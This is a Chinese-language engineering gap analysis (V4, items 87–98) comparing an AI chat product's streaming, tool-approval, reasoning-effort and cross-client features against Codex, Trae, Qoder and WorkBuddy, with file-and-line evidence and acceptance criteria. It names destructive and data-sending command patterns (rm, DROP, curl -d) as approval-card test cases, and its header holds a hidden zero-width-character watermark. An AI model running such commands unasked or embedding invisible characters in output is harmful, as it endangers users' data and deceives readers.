<!--
  © 2026 IHUI AI (智汇AI) · 版权所有者: 李春川 (Li Chunchuan) · https://aizhs.top
  Provenance-watermarked. 未授权商用可被溯源追责 (Apache-2.0 须保留本声明与 NOTICE)。
  [IHUI-AI-PROVENANCE]:⁠​‌​​‌​​‌‍‍​‌​​‌​​​‍‍​‌​‌​‌​‌‍‍​‌​​‌​​‌‍‍​​‌​‌‌​‌‍‍​‌​​​​​‌‍‍​‌​​‌​​‌‍‍‌​‌‌​‌‌‌‍‍‌‌​​‌‌​​‌‌‌‌​‌​‍‍‌‌​‌‌​​​‌​​​‌‌‌‍‍​‌​​​​​‌‍‍​‌​​‌​​‌‍‍‌​‌‌​‌‌‌‍‍‌‌​​‌‌‌​‌​​‌‌‌​‍‍‌‌​​‌‌​​​‌​​‌​‌‍‍‌​‌‌‌​‌‌‌​‌‌‌​‌‍‍‌​‌‌​‌‌‌‍‍​‌​​‌‌​​‍‍​‌​​​​‌‌‍‍‌​‌‌​‌‌‌‍‍​‌‌​​​​‌‍‍​‌‌​‌​​‌‍‍​‌‌‌‌​‌​‍‍​‌‌​‌​​​‍‍​‌‌‌​​‌‌‍‍​​‌​‌‌‌​‍‍​‌‌‌​‌​​‍‍​‌‌​‌‌‌‌‍‍​‌‌‌​​​​‍‍‌​‌‌​‌‌‌‍‍​‌​‌​​​​‍‍​‌​‌​​‌​‍‍​‌​​‌‌‌‌‍‍​‌​‌​‌‌​‍‍​‌​​​‌​‌‍‍​‌​​‌‌‌​‍‍​‌​​​​​‌‍‍​‌​​‌‌‌​‍‍​‌​​​​‌‌‍‍​‌​​​‌​‌‍‍​​‌​‌‌​‌‍‍​​‌‌​​‌​‍‍​​‌‌​​​​‍‍​​‌‌​​‌​‍‍​​‌‌​‌‌​⁠
-->

# AI 对话全链路四竞品深度对标分析 V4（Codex / Trae / Qoder / WorkBuddy）

> 编号续 V3（47–86），本轮新增 **87–105**。
> 本轮主题不是「能力有没有」，而是 **「能力存在，但用户看不见 / 只在一端看得见 / 看见了但不保真」**。
> 成文日期:2026-09-28。前序:V1(1–14 主链路有无)、V2(15–36 对话流元素粒度)、V3(47–86 能力是否真实存在并在跑)。

---

## 一、结论先行

1. **V3 的两条 P0/差距结论已被代码推翻**（按 V3 §八 自己的规矩「台账勾选态会滞后，以代码为准」现读）:
   - **V3 #73**「小程序无 AI 对话页」—— 实测 `apps/miniapp-taro/src/pkg-ai/ai/chat.tsx`(1623 行)在库且最新提交为 2026-09-27(`3f3e71a99`,D113 票),逐名覆盖 23/30 事件。**该差距已不成立**。
   - **V3 #51**「`run_in_background` 只有 sleep/echo 两个演示实现」—— 实测 `apps/ai-service/app/services/task_executors.py` 有 16 个 `async def`,且已有 import 期三面 parity 断言(`:1293-1297`)与守门 `check-background-task-type-parity.mjs`。**核心半边已落地**,只剩「8 类中 2 类仍是自证 stub」这一小口。
   - **V3 #47**「三套执行内核」—— 今天 `class AgentLoopV2` 是唯一内核(`agent_loop_v2.py:1460`),但 `agent_loop.py` 仍以 `agent_executor` 这个名字被 **3 处生产引用**(`routers/agents.py:48`、`services/a2a_service.py:33`、`services/slash_commands.py:162`)。准确表述应为「**一套半**」:V2 是真内核,V1 文件作为出口壳活着。
   - ⇒ 这三条**不得再作为待办派单**,否则就是把已交付的东西重新卖一遍。
2. **本轮实测的最大单点不是「缺功能」,是「跨端可达性塌方」**:共享流层 `packages/api-client/src/client.ts:1011-1165` 定义 **30 个 `on*` 回调**,与 SSE 契约主面 30 个事件(`packages/shared/src/sse/contract.ts:28-81`)一一对应;而 RN 主聊天屏 `apps/mobile-rn/src/screens/ChatScreen.tsx` 只接 **7 个**,**23 个未接** —— 包括 `onToolCall / onToolApproval / onPlanUpdate / onTerminal* / onSubagent* / onUsage / onBudget / onQuestion / onFormRequest / onReconnect`。手机上看 AI 对话 = 一个只有文字流的旧式聊天框。
3. **对话流「信息保真」有两处结构性失真**,V1–V3 三轮都没量到:
   - 用户消息按**纯文本**渲染(`MessageItem.tsx:884`),而发送侧把附件**拍平成 Markdown 语法**塞进正文(`use-message-send.ts:256-280`)。两者一撞:**用户自己上传的图片,在自己的气泡里显示成 `![](url)` 源码**。
   - 工具参数用 `JSON.stringify(args, null, 2)` 裸 dump(`tool-call-card.tsx:1247`),而审批弹窗要用户当场决定「允不允许」。**决定审批所需的信息形态,和实际给出的信息形态,不是同一个东西。**
4. **后端有、前端整条链路没有的一档:推理强度(reasoning effort)**。`apps/ai-service/app/core/reasoning_effort_pin.py` 有 19 处实现(对标 Codex `reasoning_effort.rs`),`packages/types/src/subagents.ts` 有 `ReasoningEffort` 类型,但 **`packages/api-client` 与 `packages/types` 的对话请求入参零命中、web 零控件** —— 四款竞品全部在对话界面暴露这一档。
5. **V3 §八 给后续会话留的建议(`scripts/audit-benchmark-delivery.mjs`)至今未落地**(`ls` 实测不存在)。上面第 1 条就是它要防的事:每轮对标都手工重验,而手工重验必漏。**本轮把它列为 #105 并排进最近一个 Sprint**。
6. **本轮自我更正一条(必须写进正文,因为它正是 #105 要防的形态)**:初稿曾把 #89 写成「主聊天流断线无自动重连」,复量后**否证** —— api-client 层有完整重连与续传(`packages/api-client/src/client.ts:2078` `maxRetries = opts.maxRetries ?? STREAM_MAX_RETRIES`、`:2129` 带 `Last-Event-ID` 头、`:3443` 从 `id:` 行记录游标),而 web **确实消费了** `onReconnect`(`apps/web/src/hooks/use-chat/send-message.ts:767-775` 弹 toast「Attempt N, retrying in Xms」,i18n 键 `reconnecting`/`reconnectAttempt` 带兜底)。#89 的真实缺陷因此**窄化为两件**:常驻连接状态件从未上屏、待决审批在重连后的恢复无取证。该条已按实测重写。

---

## 二、证据等级(沿用 V3 口径)

| 级别 | 含义 | 本轮用法 |
| --- | --- | --- |
| **E1** | 本仓代码实测,给 `文件:行号`,可复核 | 所有「现况」条目 |
| **E2** | 本仓运行时实测(命令输出/真机日志) | 未涉及 |
| **E3** | 竞品**官方文档/发布说明**原文 | 所有「竞品基线」条目 |
| **E4** | 竞品评测/社区二手 | 仅作交叉,不单独定罪 |
| **E5** | 二手不可核证 | **WorkBuddy 全部条目**(本机无本体、无安装包、无运行时取证物;本仓 `.workbuddy/` 是我方自建状态目录,与该竞品无关)。E5 不参与「有/无」判定,只作方向参考 —— 承 V3 §一.4 与 D57 票面纪律。 |

> **本轮取证方式**:4 路并行调研(web 展示层 / 引擎与工具层 / 竞品联网调研 / 其余五端),主会话对关键断言逐条自己复量。**复量否证或更正了 7 条**,全部写进正文而非留在口头:
> ① V3 #73「小程序无 AI 页」→ 已被代码推翻(§一.1);② V3 #51「后台只有 sleep/echo」→ 已被代码推翻;③ V3 #47「三套内核」→ 应为「一套半」;
> ④ `packages/app` 的 `ChatScreen` 并非「未导出」,而是**导出在位、零消费方**(`index.ts:684`);⑤ web **有**消息队列与 Steer(`queue-interaction-bar.tsx` 在库,D38 票已✅)⇒ 队列**不是**差距;
> ⑥ #89「无自动重连」→ **否证**,api-client 有重连与 `Last-Event-ID` 续传且 web 消费了 `onReconnect`,缺陷窄化为「状态件未上屏 + 待决审批恢复未取证」;#96 的「web 反而没有续传」同批否证;
> ⑦ 孤儿清单里的 `voice-note.tsx` 在 HEAD 与索引双双落空(只在工作树未跟踪面)⇒ 摘出清单;六端覆盖数改用**统一交集判据**重算,并登记两个口径不可混用。

---

## 三、本项目对话流现状量化(现读 E1,勿照抄旧档)

| 面 | 现值 | 取法 |
| --- | --- | --- |
| SSE 契约主面事件 | **30** | `awk '/^export const SSE_EVENTS/,/^}/' packages/shared/src/sse/contract.ts \| grep -cE "^  [A-Z_]+:"` |
| Anthropic 兼容面 | **6** | 同上,`SSE_COMPAT_EVENTS` 段 |
| 共享流层回调 | **30**(与主面一一对应) | `grep -oE "^  on[A-Z][A-Za-z]*\??:" packages/api-client/src/client.ts \| sort -u \| wc -l` |
| 服务端工具数 | **90**(`_TOOLS` 清单) | `grep -c "MCPTool(" apps/ai-service/app/services/mcp_server.py` |
| web 消息渲染块型 | **1 套投影 + 20 余个专门组件** | `apps/web/src/components/chat/message-list/MessageItem.tsx` |
| 六端回调覆盖(统一判据:与上面 30 名逐词交集) | **web 30/30**(按 `apps/web` 全域;`streamChat` 主调用点 29/30,第 30 个在别处消费) / extension 19/30 / cli 12/30 / **RN 主屏 7/30** / RN 另一屏 17/30 / miniapp 17/30(它不走 api-client 回调面,见下) / desktop=继承线上包 | 逐名跑 `grep -qw "<回调名>:" <端文件>` 计数(数字与命令同批现跑,勿改判据后再引用旧数) |
| miniapp 按**事件名**口径的分发覆盖 | **23/30**(缺 `thinking` `plan-step` `question` `start` `tool-approval` `budget` `form_request`) | `apps/miniapp-taro/src/api/index.ts:536 streamSSE` |

> **两个口径不可混用**:miniapp 自写传输层(#96),它按**事件名**分发所以覆盖 23/30,而按 api-client 的**回调名**交集只有 17/30 —— 差的那几个(`onDelta`/`onDone`/`onError`)它当然有实现,只是不叫这个名字。**引用这类数时必须同时报口径**,否则会出现「同一端 23 与 17 打架」的假矛盾(V3 的 budget 帧两次翻案就是栽在口径上,见其 §五 并行冲突提示④)。

---

## 四、V4 差距总表(87–105)

图例:🔴 **P0**=正确性或信任型缺陷;🟡 **P1**=体验与对等性;⚪ **P2**=长尾。

### G 组 · 对话流信息保真(87–92)——「看得见,但看见的不是真相」

---

**#87 · 🔴 P0 · 用户消息不渲染 Markdown,导致自传附件显示成源码**

- **现况(E1)**:用户消息分支是 `<p className="whitespace-pre-wrap break-words">{m.content}</p>`(`apps/web/src/components/chat/message-list/MessageItem.tsx:884`),**不经过任何 Markdown 解析**;而发送侧 `doSend` 把引用**拍平进正文**:图片 `![]()`、视频 `<video>`、长文本 fenced block、其他 `> 📎 label`(`apps/web/src/hooks/use-chat/use-message-send.ts:256-280`)。
- **后果**:用户传一张图,自己的气泡里显示 `![photo](https://…/xxx.png)` 字面量;传代码片段显示成裸三反引号。**助手侧富渲染、用户侧纯文本,同一屏两种保真度**。
- **竞品基线(E3)**:Codex transcript 对用户消息同样渲染并支持选中复制回填;Trae「添加到对话」把终端选区/浏览器元素做成**独立引用条目**而非正文文本;Qoder 把终端/回复片段转成**引用胶囊**;CodeBuddy 把 @ 引用改成**紧凑引用胶囊(带行号)**。四家共同点:**附件与引用是结构化对象,不是正文字符串**。
- **方案**(两步,第二步才是根治):
  1. **止血**:用户消息分支改用与助手侧同一套 Markdown 渲染器,但**关掉危险项**(不渲染 HTML、不执行 rehype-raw),仅代码块/图片/列表/行内码。一处改动即消除「显示成源码」。
  2. **根治(与 #91 同批)**:消息体增加**结构化附件字段**(`attachments: {kind,url,name,bytes}[]`),渲染层按字段出附件卡;正文里的 `![]()` 拍平逻辑降级为「无结构化字段时的兼容投影」。发送侧与渲染侧**必须共用一份附件判定表**(现判定在 `use-message-references.ts:45-65`,渲染另写一套 = 漂移源)。
- **验收**:① 上传 png/jpg/代码/office 四类各一条,断言用户气泡内**不出现** `![`、```` ``` ````、`> 📎` 字面量;② 图片渲染为可点开预览的缩略图;③ 与 D41(Office/PDF 产物预览)的预览器复用同一组件,**不得造第二个图片预览器**;④ e2e 覆盖暗色/折叠/流中三态。
- **边界**:这是展示层改动,**不改发送协议**,故不动 `apps/api` 的落库形态;第 2 步要动落库形态时另计票并走 §7 删除安全。

---

**#88 🔴 P0 · 推理强度(reasoning effort)前端整条链路缺席**

- **现况(E1)**:后端有实现且成体系 —— `apps/ai-service/app/core/reasoning_effort_pin.py`(19 处引用,含按 provider 钉档)、`apps/ai-service/app/core/capability_matrix.py`、`turn_metadata.py`;CLI 子代理有类型 `ReasoningEffort = minimal|low|medium|high`(`apps/cli/src/subagents/types.ts:21`)。**但对话请求面零命中**:`git grep -iE "reasoningEffort|reasoning_effort" -- packages/api-client packages/types apps/web/src` 结果为空 ⇒ 既无入参通道,也无 UI 控件。
- **后果**:用户完全无法表达「这次要想深一点/快一点」;而模型侧的档位仍按后端默认钉,账单与延迟对用户不可解释。
- **竞品基线(E3)**:Qoder **Thinking Effort low/medium/high/xhigh/max**(与 Tier/Specific Model 并列为第三根轴);Codex `/reasoning` 低中高 + `/fast`(1.5× 速度 2.5× 积分)+ Ultra;CodeBuddy「模型思考强度选择 + 思考模式开关」;Trae「Max 模式」扩上下文/思考。四家**都在对话输入区暴露**。
- **方案**:① 在 `packages/types` 的对话请求类型上开 `reasoningEffort?:` 字段(**封闭枚举,不用 string**,否则 provider 侧无法钉档);② api-client 透传;③ `apps/web/src/components/chat/model-selector.tsx`(已含 5 档 tier + 厂商分组 + 能力徽章)旁边加第三根选择轴,档位可选性**由 capability matrix 驱动**(该 provider/模型不支持就置灰并说明原因,**不得静默接受一个无效值**);④ 后端已有 `reasoning_effort_pin.py`,只需接住入参。
- **验收**:① 选 low 与 high 各发一轮,`turn_metadata` 落库的档位字段必须不同(断言真的透到了上游请求,而不是前端存了个状态);② 不支持该档的模型上,控件置灰且 tooltip 给原因;③ 五语言 i18n parity(`check-i18n-keys`)+ 零死 key;④ 与 D45(会话详情聚合档位)不冲突 —— 那是**展示**档位,这是**推理**档位,两者不得共用一个开关。

---

**#89 🟡 P1 · 连接状态件从未上屏 + 重连后待决审批的恢复无取证**(初稿曾写「无自动重连」,已否证并窄化,见 §一.6)

- **已具备(别重复造)**:自动重连与断点续传在共享层是**真的存在** —— `packages/api-client/src/client.ts:2078`(`maxRetries = opts.maxRetries ?? STREAM_MAX_RETRIES`)、`:2129`(重连请求带 `Last-Event-ID` 头)、`:3443`(从 SSE `id:` 行推进游标);web 也**确实消费**了 `onReconnect`(`apps/web/src/hooks/use-chat/send-message.ts:767-775` 弹 toast,i18n 键 `reconnecting` / `reconnectAttempt` 带未翻译兜底),`send-answer.ts:292` 同形。页面刷新后的续接另有 `resume-stream.ts:67`。
- **真缺陷 A(E1)·常驻状态件零挂载**:`apps/web/src/components/ai/progress-sections/connection-status.tsx` 的四态指示器(connecting/connected/reconnecting/disconnected)+ `deriveConnectionState` **在生产面没有任何挂载方** —— `git grep connection-status -- apps/web` 命中**全部落在测试文件** `apps/web/tests/agent-task-progress-pane.test.tsx`(:460 的 import、:1675/:1685/:1694/:1702/:1752/:1761 的断言)。即重连发生时用户只看到一条**会消失的 toast**,没有常驻状态可读。
- **真缺陷 B(E1 缺口,非已证坏)·重连后待决审批是否恢复,无人取证**:审批帧 `tool-approval` 是一次性下发(`contract.ts:64-67`),而续传按 `Last-Event-ID` 只补**游标之后**的帧。断线恰好发生在「已下发审批、用户未点」的窗口时,重连后那张审批卡会不会永久消失,**本轮未取证**(要取证需构造断线时机的端到端场景)。它不是假想风险:CodeBuddy 的发布说明把「审批弹窗与发送状态随重连恢复」列为**专门修过的问题**(E3),说明这一型在真实产品里确实会发生。
- **竞品基线(E3)**:Codex 重连保留线程状态;CodeBuddy 有重连宽限期、审批弹窗随重连恢复、切换对话 10s 超时自动放弃并明确提示;Trae/Qoder 均有显式停止与状态反馈。
- **方案**:① 把 `connection-status` 挂进消息流容器(与 D45 聚合档位条同位)—— 这是**纯接线**,不写新组件;② 先做取证:构造「断线瞬间存在待决审批」的端到端场景,记录重连后审批卡的实际状态(拿到否证比拿到合格证有用);③ 若 ② 证实会丢,修法唯一在**服务端**:`Last-Event-ID` 续传必须把该会话**未结算的待决表**一并重放(`apps/ai-service/app/services/agent_engine.py:1817/1832` 那两张 requestId→带主记录的表已有主体信息,重放出口现成),不得由前端靠本地缓存兜;④ 与 #94 同批:RN/小程序接上审批帧之后,这条重放才在两端口上成立。
- **验收**:① `connection-status` 的**生产面 importer ≥1 且排除测试面**(本仓为这条栽过 64/70/81/115/138 五次);② 人为断网 3s 再恢复,断言状态条走过 reconnecting→connected 且已到达的部分输出未被清空;③ 断线时存在一张待决审批 → 恢复后该审批仍可见、仍可操作,且**拒绝后副作用确实未发生**(副作用断言,不只看错误码);④ 若 ② 取证结论是「不会丢」,必须在本文登记否证与取证命令,不得留成悬案。

---

**#90 🟡 P1 · `usage` 帧在 TS 判别联合里没有成员,计量展示天然漂移**

- **现况(E1)**:`contract.ts:51` 声明 `USAGE: 'usage'`,Python 侧 `core/sse_contract.py:176` 有 `SSEEventContract("usage", …)`;但 TS 的判别联合 `SSEEventPayload`(`contract.ts:115-355`)**没有 `type:'usage'` 成员** —— usage 只作为 `done` 帧的可选字段存在(`:285`,且类型是 `Record<string, unknown>`)。
- **后果**:各端只能各自 `as` 断言取用,字段名/单位(input/output/cache)无类型约束;`packages/types/src` 改一下字段,六端一个都不红。
- **竞品基线(E3)**:CodeBuddy `/cost` 能按模型列 input/output/cache read/cache write token 并给 Total duration(API/wall)与 Total code changes 行数;Qoder CLI `/usage` 面板含 Total Duration + Total Code Changes 且用量 80%/95% 变色;Codex `/usage` + OTel 导出。共同点:**计量是一等契约,不是 done 帧的附带字段**。
- **方案**:① 给 `usage` 建正式判别成员(字段封闭:`inputTokens/outputTokens/cacheReadTokens/cacheWriteTokens/reasoningTokens?/costMicroUsd?/firstTokenMs?`);② `web/message-item-parts.tsx:231/295` 的徽章与 `live-usage.ts:35` 的流中估算改吃该类型(**估算口径必须与后端计费口径同源,否则用户看到「约」与账单对不上**);③ 双端 parity 由既有 `check-agent-event-parity.mjs` 覆盖,但需把「判别联合成员数 == 主面事件数」加为一条新断言 —— 这正是本条要防的「名字在、类型不在」。
- **验收**:① `tsc` 下故意把字段名写错必须红(证明类型真的在守);② 主面 30 个事件全部有判别成员(计数对账,缺一个即红);③ 六端 usage 取值不再出现 `as` 断言(grep 断言)。

---

**#91 🟡 P1 · 两套 SSE 事件命名族并存且无映射表**

- **现况(E1)**:除对话流主面(`contract.ts`,30 名)外,还有第二套 `packages/shared/src/sse/agent-events.ts`(`tool_call/tool_result/thinking/started/completed/session/…`,agent 任务流),**两族不同名、不同风格、无交叉映射表**;`contract.ts:271-275` 自陈 camelCase 与 snake_case 写错即**整帧静默丢弃**;`packages/types/src/agent-runtime.ts` 的 `AgentSSEEvent` 被 parity 脚本当兜底契约扫。
- **后果**:端内各自 if-else;「一个能力在对话流可用、在任务面板不可用」这类现象无法归因(本轮 RN/miniapp 审批缺失就是同一形态的后果之一)。
- **竞品基线**:四家均未见同型双族并存(E3 未取证到反例);此条属**我方自造复杂度**,不需要竞品来证明它是问题。
- **方案**:① 出一份**事件族登记表**(哪些属于对话流、哪些属于 agent 任务流、哪些共用),放 `packages/shared/src/sse/families.ts`,作为唯一真相;② 命名风格统一由构造层做(生产者写 snake、消费者读 snake,类型层暴露 camel 只做一层投影,投影函数唯一);③ 「写错大小写整帧静默丢弃」这一条必须改成**显式未知事件计数 + 上报**,不得静默(与 §守门速查「把没判写成判过了是最高频失效型」同一条禁令)。
- **验收**:① 未知事件计数在真仓跑一次必须为 0 且**该计数本身可被注入验证**(喂一个假事件名,断言计数 +1 且有点名);② 族登记表被引用数 ≥1 per 族;③ parity 门扩到同时判两族。

---

**#92 🟡 P1 · 工具参数是 JSON 裸 dump,不足以支撑「当场决定是否批准」**

- **现况(E1)**:`tool-call-card.tsx:1247` 把 args 走 `JSON.stringify(…, 2)` 原样打印;`stream-ui.tsx:430-456` 的 `StreamCode` 高度 200px 硬封顶,无搜索、无字段高亮;`tool-approval-dialog.tsx:217-320` 里有 `danger_level` 徽章 + `argsPreview` + once/session/always 三档 + 理由输入(**审批弹窗本身是合格的**),但**默认路径上的参数摘要只有 `describeToolCall` 的 subject/metric 两个字段**(`tool-display.ts:176-181/370`)。
- **差距**:审批要求用户在两秒内判断「这条命令能不能跑」,而界面给的是 JSON。竞品把它做成结构化卡片(见下)。
- **竞品基线(E3)**:Qoder 审批请求「给出具体命令、文件路径、目标地址与原因」并可批准/拒绝/**让 Qoder 换个做法**;Trae 命令卡片带「自动运行」下拉(本次/当前对话/所有对话)+ 超范围时在流内显示审批卡片;CodeBuddy 卡片区分「写文件卡/命令卡」并带接收中转圈态;Codex 审批条目带状态 Reviewing/Approved/Denied/Aborted/Timed out + 风险等级。
- **方案**:按 effect scope 分类给**专用摘要形态**(命令类=可换行的命令本体 + 工作目录 + 是否含删除;写文件类=路径 + 增删行数 + 可点开的 diff;网络类=method + host + path + 是否含凭据段)。分类依据取 `packages/types/src/tool-contract.ts` 的 `TOOL_EFFECT_SCOPES` —— **与 #99 是同一条链的两端**:契约不落地,分类摘要就只能继续靠工具名猜。
- **验收**:① 高危命令(含 `rm`/`DROP`/`curl -d`)在审批卡上**命令本体完整可见**且超 200px 可展开可搜索;② 三档授权语义与现有 `once/session/always`(D84)一致,不得新增第四种;③ 加「换个做法」出口(与 V3 #45 自愈工作区协同)。

---

### H 组 · 跨端可达性(93–98)——「web 做完了,等于做完了吗」

---

**#93 🔴 P0 · RN 主聊天屏只接 7/30 回调,同端两套实现**

- **现况(E1)**:`apps/mobile-rn/src/screens/ChatScreen.tsx`(3615 行,导航注册 `RootNavigator.tsx:654`)在 `streamChat` 调用点(`:652`起)只传 **7 个**回调:`onDelta(:661) / onReasoning(:673) / onError(:683) / onCitations(:703) / onInjectionApplied(:723) / onSteer(:739) / onDone(:756)`。未接的 **23 个**:`onToolCall onToolDelta onToolSummary onToolApproval onToolDelegate onPlanUpdate onTerminalStart onTerminalDelta onTerminalEnd onSubagentSpawn onSubagentProgress onSubagentEnd onUsage onBudget onCompaction onFallback onRetryScheduled onQuestion onFormRequest onReconnect onResponse onAgentDelta onMemoryUpdates`(逐名 `comm -23` 算出)。
- **更难看的是同端两套**:`apps/mobile-rn/src/screens/AiAssistantN8nScreen.tsx:1412` 起接了完整工具链(`:1472 applyToolCallEvent`、`:1489 applyToolDelta`、`:1497 applyPlanUpdate`、`:1520/1541` 终端、`:1916 TaskStatusBar`),而 `apps/mobile-rn/src/utils/chat-render-model.ts` 的 4 个 `apply*` 纯函数**在主聊天屏零调用方** —— 引擎写好了没接线。
- **差距**:§9 要求「默认全端连通、禁止只改一端交付」;V2 #23「多端同步」当年就已因此重列为 V3 #71。这一格至今是**用户可感知的最大落差**(手机上看不见 agent 在干什么)。
- **竞品基线(E3)**:Codex iOS/Android Remote 可看可接管在跑会话(带 Live Activity);Qoder 移动端可续接桌面任务并**应答待决交互**;Trae 移动端连 TraeCode;CodeBuddy 有小程序端。共同点:移动端的对话流**不缺工具与审批**。
- **方案**:① 主屏改为消费 `chat-render-model.ts` 那份现成引擎(**不新写**,这是「接线」不是「开发」);② 与 `packages/app/src/features/chat/ChatScreen.tsx`(#95 那条孤儿)二选一作唯一实现,不得两端各留一份;③ 端能力档案表:逐端声明「该端支持哪些回调」,不支持的必须**显式降级并可见**(如终端面板在手机上折叠成一行文本),不得静默不接。
- **验收**:① RN 真机跑一次带 3 个工具调用的会话,截图必须有工具卡与状态;② `applyToolCallEvent` 的**生产面 importer ≥1 且排除测试面**(本仓栽过两次:组件自带测试让孤儿一路绿);③ 与 #97 的新守门联动 —— 覆盖表不填即红。

---

**#94 🔴 P0 · 工具审批在 RN 与小程序聊天流零处理(信任型缺陷,不是体验问题)**

- **现况(E1)**:`tool-approval` 帧已在契约里(`contract.ts:64-67`,V3 #58 立),web 有 `tool-approval-dialog.tsx`、extension 有 `ToolApprovalBanner.tsx:875`、cli 有 `repl.ts:2464 createAuditedDangerGate` + `tools/danger-gate.ts`。而 `git grep "tool-approval|toolApproval" -- apps/mobile-rn/src apps/miniapp-taro/src` **零命中**。
- **后果**:手机上遇到需要审批的操作时,**要么没有弹窗、要么直接执行**,而用户完全不知道发生过这个决定。这比「功能缺失」更严重:它让「我在受控模式下使用 AI」这个承诺在移动端不成立。
- **方案**:与 #93 同一批接线(审批帧本身就在流里,只是没人接)。弹窗形态复用 `packages/app` 的对话框层;三档语义 once/session/always 必须与 web 完全一致(D84),**不得在移动端偷偷只给「允许/拒绝」两档**。
- **验收**:① 两端各跑一条高危命令,截图证明弹窗出现且能选三档;② 断言**被拒后该操作确实未执行**(副作用断言,不是只看错误码 —— 承 §「越权用例要断言未发出查询」同一条纪律);③ 被拒后**仍留人工放行入口**(拒绝是一次判定,不是永久禁止,承 AGENTS §30)。

---

**#95 🟡 P1 · `packages/app` 共享 AI 聊天屏:导出在位、零消费方**

- **现况(E1)**:`packages/app/src/index.ts:684` 确实 `export { ChatScreen } from './features/chat/ChatScreen'`(**更正调研初稿那句「未从 index.ts 导出」**——那是错的,组件本体导出了)。真问题是**全仓无人 import 它**:mobile-rn 复用的是同包其它 4 个聊天屏(`AgentChatScreen`/`CircleChatScreen`/`LiveChatScreen`/`MessageChatScreen`,各自 `src/screens/*.tsx:11-12`),**AI 对话那个屏没被用**;且 `packages/app/src` 对 `@ihui/shared/chat` 的引用数为 **0**,即它完全不在消息渲染契约上。
- **差距**:一个 100% 写好的共享实现躺在共享包里当死代码,而 RN 主屏另写一份只接 7 个回调的 —— 这是 #93 的**成本来源**。
- **方案**:与 #93 合并决策:选定唯一实现(RN 端 adapter + 共享壳),另一份按 V3 §七「孤儿件要么接要么删」处置。**不得两份都留**。
- **验收**:① 决策写进票面(选哪份、为什么);② 落选那份删除前按 §7 删除安全三问(承载什么功能/有无等价实现/无则先迁移),并走守门 99 的存续性判据(索引里仍被引用即拦)。

---

**#96 🟡 P1 · 小程序自写流式传输层,与 api-client 两份重连/退避/超时**

- **现况(E1)**:`apps/miniapp-taro/src/lib/sse.ts`(Taro `enableChunked` / H5 fetch 双通道 + `Last-Event-ID` 断点续传 + 指数退避 + 读超时 + AbortSignal)与 `src/api/index.ts:536 streamSSE` 是**端内另一套实现**;事件分发逐名覆盖 **23/30**,缺 `thinking`、`plan-step`、`question`、`start`、`tool-approval`、`budget`、`form_request` 七帧。
- **反讽点(更正初稿)**:初稿此处写「小程序端自己实现了 `Last-Event-ID` 而 web 反而没有」—— **后半句是错的**,共享层 `packages/api-client/src/client.ts:2129` 就带 `Last-Event-ID` 续传,web 通过它继承。真实形态更值得警惕:**共享层已有的能力,端内又抄了一份自己的实现**(小程序 `src/lib/sse.ts` + `src/api/index.ts:536`),于是同一条续传逻辑存在两份,而两份的退避表、超时值、缺帧处理各自演化。即「不是谁缺功能,是同一功能养了两份实现」—— 承 §4「两处算同一件事必须共用一份实现」。
- **方案**:把 api-client 的传输层做成**平台 adapter 注入**(§3 工厂模式:`createStreamTransport({ fetch | enableChunked })`),小程序端删掉自写层改调工厂 + 传平台 adapter。禁止继续维护两份重连表。
- **验收**:① 全仓 `Last-Event-ID` 语义只有一份实现(`grep -rn Last-Event-ID` 排除测试后必须落在一个文件);② 小程序补接七帧后逐帧有对应用例;③ `pnpm --filter @ihui/miniapp-taro typecheck` 零错误。

---

**#97 🟡 P1 · 事件 parity 守门只护 web,其余五端的缺失结构性不可见**

- **现况(E1)**:`scripts/check-agent-event-parity.mjs:537` 只扫 `apps/web/src`,`:809` 只把 `apps/web + api-client` 认作消费方 ⇒ miniapp / extension / cli / **mobile-rn** 的事件缺失全部不在守门范围。AGENTS §9 声明「默认全端连通」,但**机器判据只覆盖 1/6 端**。
- **差距**:这是本轮最该先修的一条 —— 因为 #93/#94/#96 全部**之所以能长期存在**,就是因为没人看守这一维。**先补尺子,再清偿存量**,顺序反了就会天天漏。
- **方案**:① 建**端能力档案表**(`scripts/data/end-capability-profile.json`,逐端声明支持的回调/帧集合,必须带 `reason` 与 `until`,挂守门 108 到期账);② parity 门把消费面从 web-only 扩到六端,**按档案表判**:档案里声明支持的必须真接,档案里没有的必须在报告里显式列为「该端不支持:原因」,不得静默;③ 与 #105 的交付核验尺子共用一份「存在性判据」。
- **验收**:① 摘掉 web 某个 `on*` 回调,门必须红(阳性对照);② 摘掉 **RN** 某个回调也必须红(证明扩面真的生效,不是只改了清单 —— 本仓 §4「给守门扩面必须同批改两半」同一条);③ 存量按「该文件 HEAD 自身计数」套棘轮,绝不产出恒红门(§12e)。

---

**#98 🟡 P1 · 桌面端三处口径互斥(薄壳本身是决策,矛盾才是缺陷)**

- **现况(E1)**:三处说法互相打脸 ——
  1. `apps/desktop/src-tauri/tauri.conf.json:10` `frontendDist: "shell"`、`:18` `url: "https://aizhs.top/agents"`(**远程壳**);
  2. `scripts/ensure-web-out.mjs` 头注自称「单产物分发契约的唯一校验点」,但 `tauri.conf.json:8` `beforeBuildCommand: ""` 且 `package.json` 的 `build` 直跑 `tauri build` ⇒ **该脚本在构建链上永不执行**;
  3. `docs/MULTI_END.md §2.5` 称桌面端用 React18+Vite 并复用 `@ihui/api-client`/`@ihui/types`/`@ihui/ui-react` —— 而 `apps/desktop/package.json:7-21` 的依赖只有 `@tauri-apps/cli` + `rimraf`,**零相关依赖**。
- **重要边界**:V3 #72 已明确「**保留薄壳策略**(前端单一事实源在 web),只加本地能力层,不复制 UI」—— 这是已拍板的架构,**本条不得把它读成「该改成产物分发」**(承最近记过的教训:文档说 A 代码做 B 时,先查 B 是不是人刚拍的)。矛盾的是**三处文档/脚本/配置互相指认**,不是架构选型。
- **方案**(三选一,建议 A):
  - **A(推荐)·口径对齐 + 盲区显式化**:① 删或改写 `ensure-web-out.mjs` 的「唯一校验点」声称,并在其头注写明它当前**不在构建链**;② `docs/MULTI_END.md §2.5` 按实测改写成「远程壳 + 本地能力层」;③ 明确登记「桌面端 AI 对话的版本由线上站点决定,本仓不可校验」这一事实及其风险(线上部署与本地代码不一致时,桌面端表现不属于本仓可复现范围)。
  - B·真上产物分发:改 `beforeBuildCommand` 跑 `ensure-web-out.mjs`,并给版本锁定与离线降级方案。爆炸半径大,需要用户拍板。
  - C·删脚本:若桌面端永不自带前端,`ensure-web-out.mjs` 属死代码,按 V3 §七 孤儿规矩删除。
